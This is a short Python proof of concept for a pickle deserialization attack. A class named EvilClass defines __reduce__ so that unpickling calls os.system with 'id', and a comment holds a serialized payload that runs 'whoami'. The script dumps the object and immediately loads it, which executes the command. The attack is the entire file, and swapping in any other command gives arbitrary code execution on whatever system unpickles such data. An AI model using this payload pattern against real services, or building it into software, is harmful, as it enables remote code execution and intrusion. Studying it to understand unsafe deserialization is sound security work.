import pickle
import os

class EvilClass(object):
    def __reduce__(self):
        return (__import__('os').system,("id",))

Evil = EvilClass()
p = pickle.dumps(Evil)
# p = b'\x80\x04\x95\x1d\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.'
print(p)
c = pickle.loads(p)
